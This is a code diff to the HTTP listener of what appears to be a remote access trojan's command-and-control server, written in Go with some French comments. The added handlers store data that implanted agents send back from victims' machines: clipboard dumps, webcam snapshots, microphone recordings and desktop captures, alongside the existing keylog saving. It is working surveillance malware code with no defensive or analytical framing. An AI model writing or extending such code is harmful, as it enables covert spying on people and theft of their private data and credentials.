@@ -221,6 +221,53 @@ func (l *HTTPListener) handleResult(req *protocol.AgentRequest) []byte {
 				log.Printf("[-] Failed to save keylog: %v", err)
 			}
 		}
+
+		// Handle clipboard dump results
+		if qt.Task.Command == protocol.CmdClipboardDump && len(result.Output) > 0 && result.Output != "No clipboard data captured" {
+			path, err := handlers.SaveClipboard(req.ID, result.Output)
+			if err == nil {
+				log.Printf("[+] Clipboard dump saved for agent %s: %s", req.ID[:8], path)
+				result.Output = fmt.Sprintf("Clipboard dump saved to: %s\n\n%s", path, result.Output)
+			} else {
+				log.Printf("[-] Failed to save clipboard dump: %v", err)
+			}
+		}
+
+		// Gère les résultats webcam
+		if qt.Task.Command == protocol.CmdWebcamSnap && len(result.Data) > 0 {
+			path, err := handlers.SaveWebcam(req.ID, result.Data)
+			if err == nil {
+				result.Output = fmt.Sprintf("Webcam snapshot saved to: %s", path)
+				log.Printf("[+] Webcam snapshot saved for agent %s: %s", req.ID[:8], path)
+			} else {
+				log.Printf("[-] Failed to save webcam snapshot: %v", err)
+				result.Output = fmt.Sprintf("Failed to save webcam: %v", err)
+			}
+		}
+
+		// Gère les résultats microphone
+		if qt.Task.Command == protocol.CmdMicRecord && len(result.Data) > 0 {
+			path, err := handlers.SaveAudio(req.ID, result.Data)
+			if err == nil {
+				result.Output = fmt.Sprintf("Audio recording saved to: %s", path)
+				log.Printf("[+] Audio recording saved for agent %s: %s", req.ID[:8], path)
+			} else {
+				log.Printf("[-] Failed to save audio recording: %v", err)
+				result.Output = fmt.Sprintf("Failed to save audio: %v", err)
+			}
+		}
+
+		// Gère les résultats desktop capture
+		if qt.Task.Command == protocol.CmdDesktopCapture && len(result.Data) > 0 {
+			path, err := handlers.SaveDesktopFrame(req.ID, result.Data)
+			if err == nil {
+				result.Output = fmt.Sprintf("Desktop frame saved to: %s", path)
+				log.Printf("[+] Desktop frame saved for agent %s: %s", req.ID[:8], path)
+			} else {
+				log.Printf("[-] Failed to save desktop frame: %v", err)
+				result.Output = fmt.Sprintf("Failed to save desktop frame: %v", err)
+			}
+		}
 	}
 
 	// Enregistre le résultat
